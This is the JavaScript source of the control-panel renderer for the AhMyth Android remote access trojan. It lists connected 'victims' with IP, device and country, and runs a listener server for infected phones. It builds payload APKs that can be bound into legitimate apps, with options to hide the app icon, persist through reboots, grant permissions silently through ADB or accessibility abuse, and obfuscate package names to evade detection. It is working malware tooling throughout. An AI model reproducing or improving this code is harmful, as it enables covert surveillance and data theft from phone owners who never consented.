var app = angular.module('myapp', []);
const {
    remote
} = require('electron');
const {
    ipcRenderer
} = require('electron');

// Handle remote module with error handling
let dialog, victimsList, shell;
try {
    dialog = remote ? remote.dialog : null;
    victimsList = remote ? remote.require('./main') : null;
    shell = remote ? remote.shell : require('electron').shell;
} catch (e) {
    console.error("Failed to load remote modules:", e);
    dialog = null;
    victimsList = null;
    shell = null;
}

var fs = require('fs-extra');
const path = require('path');
var homedir = require('node-homedir');
const {
    dirname
} = require('path');
var dir = require("path");

// Ensure Java 11 is discoverable for child processes used during APK build
const DEFAULT_JAVA_HOME = process.platform === 'win32'
    ? 'C:\\Program Files\\Eclipse Adoptium\\jdk-11.0.29.7-hotspot'
    : null;
if (!process.env.JAVA_HOME && DEFAULT_JAVA_HOME && fs.existsSync(DEFAULT_JAVA_HOME)) {
    process.env.JAVA_HOME = DEFAULT_JAVA_HOME;
}
if (process.env.JAVA_HOME) {
    const javaBin = path.join(process.env.JAVA_HOME, 'bin');
    if (!process.env.PATH.toLowerCase().includes(javaBin.toLowerCase())) {
        process.env.PATH = `${javaBin};${process.env.PATH}`;
    }
}

// Fix Constants require path - use path resolution that works in Electron renderer
let CONSTANTS;
try {
    // Try relative path first (works when script is loaded as module)
    CONSTANTS = require('../Constants');
} catch (e) {
    try {
        // Fallback: resolve from app directory
        const remote = require('electron').remote;
        if (remote && remote.app) {
            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(appPath);
        } else {
            // Last resort: try resolving from known structure
            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(constantsPath);
        }
    } catch (e2) {
        console.error('Failed to load Constants:', e2);
        // Create a minimal fallback to prevent complete failure
        CONSTANTS = {
            apkName: 'Ahmyth.apk',
            signedApkName: 'Ahmyth-aligned-debugSigned.apk',
            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
            defaultPort: 1234,
            dataDir: 'AhMyth',
            downloadPath: 'Downloads',
            outputApkPath: 'Output'
        };
    }
}
const {
    promisify
} = require('util');
const { exec: execCallback } = require('child_process');
const exec = promisify(execCallback);
var xml2js = require('xml2js');
var readdirp = require('readdirp');
//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);

// Ensure output directory exists
if (!fs.existsSync(outputPath)) {
    fs.mkdirpSync(outputPath);
}
//--------------------------------------------------------------

// Country code to flag image (using flagcdn.com for reliable rendering on all OS)
const countryCodeToFlag = (countryCode) => {
    if (!countryCode) return { type: 'icon', value: 'globe', title: 'Unknown' };
    const cc = countryCode.toLowerCase();
    // Handle special cases
    if (cc === 'local') return { type: 'icon', value: 'home', title: 'Local Network' };
    if (cc === 'lan') return { type: 'icon', value: 'linkify', title: 'LAN' };
    // Validate country code (must be 2 letters)
    if (!/^[a-z]{2}$/i.test(cc)) return { type: 'icon', value: 'globe', title: 'Unknown' };
    // Return flag image URL
    return { 
        type: 'flag', 
        value: `https://flagcdn.com/24x18/${cc}.png`,
        value2x: `https://flagcdn.com/48x36/${cc}.png`,
        title: cc.toUpperCase()
    };
};

// Legacy emoji function (kept for compatibility)
const countryCodeToEmoji = (countryCode) => {
    if (!countryCode) return '🌐';
    const cc = countryCode.toUpperCase();
    if (cc === 'LOCAL') return '🏠';
    if (cc === 'LAN') return '🔗';
    if (!/^[A-Z]{2}$/.test(cc)) return '🌐';
    const chars = [...cc].map(c => String.fromCodePoint(0x1F1A5 + c.charCodeAt(0)));
    return chars.join('');
};

// App Controller for (index.html)
app.controller("AppCtrl", ($scope, $sce) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    }; //default values for binding apk

    // Dashboard/Settings properties
    $appCtrl.platform = process.platform === 'win32' ? 'Windows' : process.platform === 'darwin' ? 'macOS' : 'Linux';
    $appCtrl.outputPath = outputPath;
    $appCtrl.downloadsPath = downloadsPath;
    $appCtrl.builtPayloads = [];
    $appCtrl.defaultPort = CONSTANTS.defaultPort || 42474;
    $appCtrl.showNotifications = true;
    $appCtrl.playSoundOnVictim = false;
    $appCtrl.autoStartServer = false;
    
    // Stealth configuration options
    $appCtrl.stealthOptions = {
        hideIcon: true,           // Hide app icon from launcher
        hideFromRecents: true,    // Exclude from recent apps
        startOnBoot: true,        // Auto-start on boot
        silentNotification: true, // Use minimal notification
        persistentService: true,  // Auto-restart if killed
        wakelock: true           // Keep CPU wake lock
    };

    // Silent permissions options
    $appCtrl.silentPermOptions = {
        generateAdbScript: true,   // Generate ADB script to grant permissions
        skipPrompts: false,        // Skip permission prompts (request silently)
        useAccessibility: false,   // Use accessibility service to auto-grant
        deviceOwner: false         // Enable device owner mode
    };

    // Obfuscation options
    $appCtrl.obfuscationOptions = {
        randomizePackage: true,    // Generate random package name
        randomizeAppName: true,    // Generate random app name
        injectJunk: true,          // Inject junk classes
        randomizeVersion: true,    // Random version code
        addMetadata: true,         // Add random metadata files
        modifySignature: true,     // Unique build signature
        customPackage: '',         // Custom package name (optional)
        customAppName: ''          // Custom app name (optional)
    };

    // Permissions/Features selection
    $appCtrl.permissions = {
        camera: false,
        storage: false,
        microphone: false,
        location: false,
        contacts: false,
        sms: false,
        callLogs: false,
        wifi: true,
        accounts: false,
        phoneCall: false,
        screenCapture: false,
        notifications: false,
        clipboard: false,
        apps: false,
        browser: false,
        usageStats: false
    };

    // Select all permissions
    $appCtrl.selectAllPermissions = () => {
        Object.keys($appCtrl.permissions).forEach(key => {
            $appCtrl.permissions[key] = true;
        });
    };

    // Deselect all permissions
    $appCtrl.deselectAllPermissions = () => {
        Object.keys($appCtrl.permissions).forEach(key => {
            $appCtrl.permissions[key] = false;
        });
    };

    // Get count of selected permissions
    $appCtrl.getSelectedPermissionsCount = () => {
        return Object.values($appCtrl.permissions).filter(v => v === true).length;
    };

    // Obfuscation preview
    $appCtrl.previewPackage = '';
    $appCtrl.previewAppName = '';

    // Load obfuscator
    const APKObfuscator = require('./assets/js/obfuscator.js');
    const obfuscator = new APKObfuscator();

    // Generate preview names
    $appCtrl.regeneratePreview = () => {
        $appCtrl.previewPackage = $appCtrl.obfuscationOptions.customPackage || obfuscator.generatePackageName();
        $appCtrl.previewAppName = $appCtrl.obfuscationOptions.customAppName || obfuscator.generateAppName();
        if (!$appCtrl.$$phase) {
            $appCtrl.$apply();
        }
    };
    
    // Initialize preview
    setTimeout(() => {
        $appCtrl.regeneratePreview();
    }, 500);

    $appCtrl.logs = [];
    $appCtrl.isListen = false;

    // Get victim count
    $appCtrl.getVictimCount = () => {
        return Object.keys(viclist).length;
    };

    // Get online victim count
    $appCtrl.getOnlineCount = () => {
        return Object.values(viclist).filter(v => v.isOnline !== false).length;
    };

    // Get offline victim count
    $appCtrl.getOfflineCount = () => {
        return Object.values(viclist).filter(v => v.isOnline === false).length;
    };

    // Format last seen time
    $appCtrl.formatLastSeen = (timestamp) => {
        if (!timestamp) return 'Unknown';
        const diff = Date.now() - timestamp;
        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return Math.floor(diff / 60000) + ' min ago';
        if (diff < 86400000) return Math.floor(diff / 3600000) + ' hours ago';
        return Math.floor(diff / 86400000) + ' days ago';
    };

    // Payload management
    $appCtrl.refreshPayloads = () => {
        try {
            if (fs.existsSync(outputPath)) {
                const files = fs.readdirSync(outputPath).filter(f => f.endsWith('.apk'));
                $appCtrl.builtPayloads = files.map(f => {
                    const stats = fs.statSync(path.join(outputPath, f));
                    return {
                        name: f,
                        path: path.join(outputPath, f),
                        size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                        date: stats.mtime
                    };
                }).sort((a, b) => b.date - a.date);
            }
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            console.error('Error refreshing payloads:', e);
        }
    };

    // Copy payload path to clipboard
    $appCtrl.copyPayloadPath = (payload) => {
        if (payload && payload.path) {
            require('electron').clipboard.writeText(payload.path);
            $appCtrl.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    // Open folders
    $appCtrl.openOutputFolder = () => {
        if (shell) {
            shell.openPath(outputPath);
        }
    };

    $appCtrl.openDownloadsFolder = () => {
        if (shell) {
            shell.openPath(downloadsPath);
        }
    };

    // Initialize payloads list
    $appCtrl.refreshPayloads();

    // ========== TEST SUITE CONTROLLER ==========
    $appCtrl.testConfig = {
        deviceId: '',
        serverIP: '192.168.0.180',
        port: 1234,
        autoBuild: true,
        forceRebuild: true,
        onlyFailing: false
    };
    
    $appCtrl.availableDevices = [];
    $appCtrl.isRunning = false;
    $appCtrl.outputLines = [];
    $appCtrl.testStats = {
        total: 0,
        passed: 0,
        failed: 0
    };
    $appCtrl.testResults = [];
    $appCtrl.testProcess = null;

    // Refresh ADB devices
    $appCtrl.refreshDevices = async () => {
        try {
            const { exec } = require('child_process');
            const { promisify } = require('util');
            const execAsync = promisify(exec);
            
            const { stdout } = await execAsync('adb devices');
            const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
            const devices = [];
            
            for (const line of lines) {
                const parts = line.trim().split(/\s+/);
                if (parts.length >= 2 && parts[1] === 'device') {
                    const deviceId = parts[0];
                    // Try to get device model
                    try {
                        const { stdout: model } = await execAsync(`adb -s ${deviceId} shell getprop ro.product.model`).catch(() => ({ stdout: 'Unknown' }));
                        const { stdout: android } = await execAsync(`adb -s ${deviceId} shell getprop ro.build.version.release`).catch(() => ({ stdout: 'Unknown' }));
                        devices.push({
                            id: deviceId,
                            name: `${model.toString().trim()} (Android ${android.toString().trim()})`
                        });
                    } catch (e) {
                        devices.push({
                            id: deviceId,
                            name: deviceId
                        });
                    }
                }
            }
            
            $appCtrl.availableDevices = devices;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            console.error('Error refreshing devices:', e);
            $appCtrl.addOutput('Error refreshing devices: ' + e.message, 'error');
        }
    };

    // Add output line
    $appCtrl.addOutput = (content, type = 'info') => {
        const time = new Date().toLocaleTimeString();
        $appCtrl.outputLines.push({ time, content, type });
        // Keep only last 1000 lines
        if ($appCtrl.outputLines.length > 1000) {
            $appCtrl.outputLines.shift();
        }
        // Auto-scroll to bottom
        setTimeout(() => {
            const outputEl = document.getElementById('testOutput');
            if (outputEl) {
                outputEl.scrollTop = outputEl.scrollHeight;
            }
        }, 100);
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Clear output
    $appCtrl.clearOutput = () => {
        $appCtrl.outputLines = [];
        $appCtrl.testResults = [];
        $appCtrl.testStats = { total: 0, passed: 0, failed: 0 };
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Start tests
    $appCtrl.startTests = () => {
        if ($appCtrl.isRunning) return;
        
        $appCtrl.isRunning = true;
        $appCtrl.clearOutput();
        $appCtrl.addOutput('Starting comprehensive test suite...', 'info');
        
        // Send IPC message to main process
        ipcRenderer.send('test-suite:start', $appCtrl.testConfig);
    };

    // Stop tests
    $appCtrl.stopTests = () => {
        if (!$appCtrl.isRunning) return;
        
        $appCtrl.addOutput('Stopping tests...', 'warn');
        ipcRenderer.send('test-suite:stop');
    };

    // Listen for test output from main process
    ipcRenderer.on('test-suite:output', (event, data) => {
        $appCtrl.addOutput(data.message, data.type || 'info');
    });

    // Listen for test result
    ipcRenderer.on('test-suite:result', (event, result) => {
        $appCtrl.testResults.push(result);
        if (result.success) {
            $appCtrl.testStats.passed++;
        } else {
            $appCtrl.testStats.failed++;
        }
        $appCtrl.testStats.total = $appCtrl.testResults.length;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test statistics update
    ipcRenderer.on('test-suite:stats', (event, stats) => {
        $appCtrl.testStats = stats;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test completion
    ipcRenderer.on('test-suite:complete', (event, stats) => {
        $appCtrl.isRunning = false;
        if (stats && stats.total > 0) {
            $appCtrl.testStats = stats;
        }
        $appCtrl.addOutput(`\nTest suite completed. Total: ${$appCtrl.testStats.total}, Passed: ${$appCtrl.testStats.passed}, Failed: ${$appCtrl.testStats.failed}`, 
                          $appCtrl.testStats.failed === 0 ? 'success' : 'error');
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test error
    ipcRenderer.on('test-suite:error', (event, error) => {
        $appCtrl.isRunning = false;
        $appCtrl.addOutput('Error: ' + error.message, 'error');
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Initialize devices on load
    setTimeout(() => {
        $appCtrl.refreshDevices();
    }, 1000);

    // ========== REQUEST/RESPONSE LOGS CONTROLLER ==========
    $appCtrl.requestLogs = [];
    $appCtrl.autoScrollLogs = true;
    $appCtrl.logFilters = {
        request: true,
        response: true,
        info: true,
        error: true
    };
    
    // Log filter function
    $appCtrl.logFilter = (log) => {
        return $appCtrl.logFilters[log.type] !== false;
    };
    
    // Get log count by type
    $appCtrl.getLogCount = (type) => {
        return $appCtrl.requestLogs.filter(l => l.type === type).length;
    };
    
    // Clear request logs
    $appCtrl.clearRequestLogs = () => {
        $appCtrl.requestLogs = [];
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Toggle auto-scroll
    $appCtrl.toggleAutoScroll = () => {
        $appCtrl.autoScrollLogs = !$appCtrl.autoScrollLogs;
        if ($appCtrl.autoScrollLogs) {
            $appCtrl.scrollLogsToBottom();
        }
    };
    
    // Apply log filters
    $appCtrl.applyLogFilters = () => {
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Toggle log data expansion
    $appCtrl.toggleLogData = (index) => {
        if ($appCtrl.requestLogs[index]) {
            $appCtrl.requestLogs[index].expanded = !$appCtrl.requestLogs[index].expanded;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        }
    };
    
    // Scroll logs to bottom
    $appCtrl.scrollLogsToBottom = () => {
        setTimeout(() => {
            const logsContent = document.getElementById('logsContent');
            if (logsContent) {
                logsContent.scrollTop = logsContent.scrollHeight;
            }
        }, 100);
    };
    
    // Add log entry
    $appCtrl.addRequestLog = (logEntry) => {
        const time = new Date().toLocaleTimeString();
        $appCtrl.requestLogs.push({
            time: time,
            type: logEntry.type || 'info',
            deviceId: logEntry.deviceId || '',
            command: logEntry.command || '',
            data: logEntry.data || '',
            expanded: false
        });
        
        // Keep only last 1000 entries
        if ($appCtrl.requestLogs.length > 1000) {
            $appCtrl.requestLogs.shift();
        }
        
        // Auto-scroll if enabled
        if ($appCtrl.autoScrollLogs) {
            $appCtrl.scrollLogsToBottom();
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Listen for log events from main process
    ipcRenderer.on('log:request', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'request',
            deviceId: data.deviceId,
            command: data.command,
            data: data.data ? JSON.stringify(data.data, null, 2) : ''
        });
    });
    
    ipcRenderer.on('log:response', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'response',
            deviceId: data.deviceId,
            command: data.command,
            data: data.data ? JSON.stringify(data.data, null, 2) : ''
        });
    });
    
    ipcRenderer.on('log:info', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'info',
            deviceId: '',
            command: '',
            data: data.message || ''
        });
    });
    
    ipcRenderer.on('log:error', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'error',
            deviceId: '',
            command: '',
            data: data.message || ''
        });
    });

    // Convert country code to flag image (works on all OS including Windows)
    $appCtrl.getCountryFlag = (countryCode) => {
        const flag = countryCodeToFlag(countryCode);
        if (flag.type === 'icon') {
            // Use Semantic UI icon for special cases
            return $sce.trustAsHtml(`<span class="country-flag" title="${flag.title}"><i class="${flag.value} icon"></i></span>`);
        } else {
            // Use actual flag image from CDN
            return $sce.trustAsHtml(`<img class="country-flag-img" src="${flag.value}" srcset="${flag.value2x} 2x" alt="${flag.title}" title="${flag.title}" style="width:24px;height:18px;vertical-align:middle;border-radius:2px;box-shadow:0 1px 3px rgba(0,0,0,0.3);">`);
        }
    };

    // Wait for DOM to be ready and initialize UI components
    var initUI = () => {
        var log = document.getElementById("log");
        if (!log) {
            console.error("[AhMyth] Log element not found! Retrying...");
            setTimeout(initUI, 100);
            return;
        }
        console.log("[AhMyth] Log element found, UI initialized");

        try {
            if (typeof $ !== 'undefined') {
                $('.menu .item').tab();
                $('.ui.dropdown').dropdown();
            }
        } catch (e) {
            console.error("[AhMyth] Error initializing UI components:", e);
        }
    };
    
    // Try multiple times to ensure DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initUI);
    } else {
        setTimeout(initUI, 50);
    }

    // Handle remote module with fallback
    let electronWindow;
    try {
        electronWindow = remote.getCurrentWindow();
    } catch (e) {
        console.error("[AhMyth] Remote module not available:", e);
        // Fallback: use IPC to communicate with main process
        electronWindow = null;
    }

    $appCtrl.close = () => {
        if (electronWindow) {
            electronWindow.close();
        } else {
            ipcRenderer.send('window-close');
        }
    };

    $appCtrl.minimize = () => {
        if (electronWindow) {
            electronWindow.minimize();
        } else {
            ipcRenderer.send('window-minimize');
        }
    };

    $appCtrl.maximize = () => {
        if (electronWindow) {
            if (electronWindow.isMaximized()) {
                electronWindow.unmaximize(); // Restore the window size
            } else {
                electronWindow.maximize(); // Maximize the window
            }
        } else {
            ipcRenderer.send('window-maximize');
        }
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        $appCtrl.Log(`[→] Initiating server on port ${port}...`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send("SocketIO:Listen", port);
    };

    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        $appCtrl.Log(`[→] Stopping server on port ${port}...`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send("SocketIO:Stop", port);
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.Log(`[ℹ] Server is now accepting connections`, CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = true;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.Log(`[ℹ] All connections have been terminated`, CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        try {
            if (victimsList) {
                viclist[index] = victimsList.getVictim(index);
                if (viclist[index]) {
                    const victim = viclist[index];
                    $appCtrl.Log(`[✓] New victim connected!`, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log(`    ├─ IP: ${victim.ip}:${victim.port}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    ├─ Device: ${victim.manf} ${victim.model}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    ├─ Android: ${victim.release}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    └─ Country: ${victim.country ? victim.country.toUpperCase() : 'Unknown'}`, CONSTANTS.logStatus.INFO);
                }
            }
        } catch (e) {
            console.error("[AhMyth] Error getting victim:", e);
            $appCtrl.Log(`[✗] Error retrieving victim data: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(`[✗] Server Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(`[✗] Stop Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            $appCtrl.Log(`[⚠] Victim disconnected: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
        }
        delete viclist[index];
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle victim going offline (keep in list)
    ipcRenderer.on('SocketIO:VictimOffline', (event, index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            victim.isOnline = false;
            victim.lastSeen = Date.now();
            $appCtrl.Log(`[⚠] Victim went offline: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle live battery updates
    ipcRenderer.on('SocketIO:BatteryUpdate', (event, data) => {
        if (viclist[data.id]) {
            viclist[data.id].battery = data.battery;
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
        }
    });

    // Remove victim permanently
    $appCtrl.removeVictim = (index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            $appCtrl.Log(`[✗] Removed victim: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.INFO);
            delete viclist[index];
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
        }
    };

    $appCtrl.openLab = (index) => {
        if (!viclist[index] || !viclist[index].isOnline) {
            $appCtrl.Log(`[✗] Cannot open lab - victim is offline`, CONSTANTS.logStatus.FAIL);
            return;
        }
        $appCtrl.Log(`[→] Opening lab for victim: ${viclist[index].ip}`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };
    
    // Function to open folder/file in system file manager
    $appCtrl.openPath = (filePath) => {
        if (!shell) {
            $appCtrl.Log('[✗] Cannot open path: shell module not available', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        try {
            // Check if it's a file or folder
            const fs = require('fs-extra');
            const path = require('path');
            
            // Normalize the path
            let normalizedPath = filePath.trim();
            
            // If it's a file, open the containing folder and select the file
            if (fs.existsSync(normalizedPath)) {
                const stats = fs.statSync(normalizedPath);
                if (stats.isFile()) {
                    // Open folder and select file (Windows/Linux/Mac)
                    shell.showItemInFolder(normalizedPath);
                } else {
                    // It's a directory, just open it
                    shell.openPath(normalizedPath);
                }
                $appCtrl.Log(`[✓] Opened: ${normalizedPath}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                // Path doesn't exist, try to open parent directory
                const parentDir = path.dirname(normalizedPath);
                if (fs.existsSync(parentDir)) {
                    shell.openPath(parentDir);
                    $appCtrl.Log(`[ℹ] Opened parent folder: ${parentDir}`, CONSTANTS.logStatus.INFO);
                } else {
                    $appCtrl.Log(`[✗] Path not found: ${normalizedPath}`, CONSTANTS.logStatus.FAIL);
                }
            }
        } catch (error) {
            $appCtrl.Log(`[✗] Error opening path: ${error.message}`, CONSTANTS.logStatus.FAIL);
        }
    };


    // Enhanced logging with detailed timestamps and levels
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        var levelPrefix = '';
        
        if (status == CONSTANTS.logStatus.SUCCESS) {
            fontColor = CONSTANTS.logColors.GREEN;
            levelPrefix = 'SUCCESS';
        } else if (status == CONSTANTS.logStatus.FAIL) {
            fontColor = CONSTANTS.logColors.RED;
            levelPrefix = 'ERROR';
        } else if (status == CONSTANTS.logStatus.INFO) {
            fontColor = CONSTANTS.logColors.YELLOW;
            levelPrefix = 'INFO';
        } else if (status == CONSTANTS.logStatus.WARNING) {
            fontColor = CONSTANTS.logColors.ORANGE;
            levelPrefix = 'WARNING';
        } else {
            levelPrefix = 'LOG';
        }

        const now = new Date();
        const timestamp = now.toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        // Check if message contains a file path and make it clickable
        let clickablePath = null;
        let displayMsg = msg;
        
        // Detect file paths in the message (paths that start with └─ or contain drive letters or /)
        // Match paths like: C:\path\to\file, /path/to/file, or paths after └─
        const pathMatch = msg.match(/(?:└─\s*)?([A-Z]:[\\\/](?:[^\s<>"']+[\\\/])*[^\s<>"']+|(?:[\\\/][^\s<>"']+)+)/);
        if (pathMatch && pathMatch[1]) {
            clickablePath = pathMatch[1].trim();
            // Escape HTML and create clickable link
            const escapedPath = clickablePath.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
            displayMsg = msg.replace(clickablePath, `<a href="#" class="log-path-link" data-path="${escapedPath}" onclick="return false;">${clickablePath}</a>`);
        }
        
        $appCtrl.logs.push({
            date: `[${timestamp}]`,
            msg: msg,
            displayMsg: displayMsg,
            clickablePath: clickablePath,
            isHtml: clickablePath !== null,
            color: fontColor,
            level: levelPrefix
        });
        
        // Ensure log element exists before scrolling
        setTimeout(() => {
            var log = document.getElementById("log");
            if (log) {
                const logContent = log.querySelector('.log-content');
                if (logContent) {
                    // Only auto-scroll if user is at the bottom or within 50px of the bottom
                    const scrollThreshold = 50; // px
                    const isAtBottom = logContent.scrollHeight - logContent.scrollTop <= logContent.clientHeight + scrollThreshold;
                    
                    if (isAtBottom) {
                        logContent.scrollTop = logContent.scrollHeight;
                    }
                } else {
                    // Fallback for older structure, still apply threshold
                    const scrollThreshold = 50; // px
                    const isAtBottom = log.scrollHeight - log.scrollTop <= log.clientHeight + scrollThreshold;
                    if (isAtBottom) {
                        log.scrollTop = log.scrollHeight;
                    }
                }
            }
        }, 0);
        
        if (!$appCtrl.$$phase) {
            $appCtrl.$apply();
        }
    }

    // function to clear the logs each time a button is clicked,
    // this is done to keep things clean.
    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
    }

    // Initial welcome messages
    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[⚠] WARNING: AhMyth will cease support for 32-bit systems when Apktool reaches v3.0.0', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('╔════════════════════════════════════════════════════════════╗', CONSTANTS.logStatus.SUCCESS);
        delayedLog('║       Welcome to AhMyth Android R.A.T v2.0                 ║', CONSTANTS.logStatus.SUCCESS);
        delayedLog('║       Modern Edition with Enhanced Features                ║', CONSTANTS.logStatus.SUCCESS);
        delayedLog('╚════════════════════════════════════════════════════════════╝', CONSTANTS.logStatus.SUCCESS);
        delayedLog('');
        delayedLog('[ℹ] System initialized successfully', CONSTANTS.logStatus.INFO);
        delayedLog('[ℹ] Ready to start server and accept connections', CONSTANTS.logStatus.INFO);
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        if (!dialog) {
            $appCtrl.Log('[✗] Dialog module not available', CONSTANTS.logStatus.FAIL);
            return;
        }
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[ℹ] APK selection cancelled', CONSTANTS.logStatus.INFO);
            } else {
                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop();
                $appCtrl.Log(`[✓] APK selected: "${apkName}"`, CONSTANTS.logStatus.SUCCESS);
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[✗] Failed to open file dialog', CONSTANTS.logStatus.FAIL);
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // Function to apply stealth and permission options to StealthConfig.smali
    async function applyStealthConfigToSmali(apkFolder) {
        const stealthConfigPaths = [
            dir.join(apkFolder, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
            dir.join(apkFolder, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
            dir.join(apkFolder, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali')
        ];
        
        let stealthConfigPath = null;
        for (const path of stealthConfigPaths) {
            if (fs.existsSync(path)) {
                stealthConfigPath = path;
                break;
            }
        }
        
        if (!stealthConfigPath) {
            delayedLog('[⚠] StealthConfig.smali not found, skipping stealth config modification', CONSTANTS.logStatus.WARNING);
            return;
        }
        
        try {
            delayedLog('[→] Modifying StealthConfig.smali...', CONSTANTS.logStatus.INFO);
            let smaliContent = await fs.promises.readFile(stealthConfigPath, 'utf8');
            
            // Map GUI options to StealthConfig fields
            const stealthMappings = {
                'HIDE_ICON': $appCtrl.stealthOptions?.hideIcon ?? true,
                'HIDE_FROM_RECENTS': $appCtrl.stealthOptions?.hideFromRecents ?? false,
                'START_ON_BOOT': $appCtrl.stealthOptions?.startOnBoot ?? true,
                'SILENT_NOTIFICATION': $appCtrl.stealthOptions?.silentNotification ?? false,
                'PERSISTENT_SERVICE': $appCtrl.stealthOptions?.persistentService ?? true,
                'WAKE_LOCK': $appCtrl.stealthOptions?.wakelock ?? true,
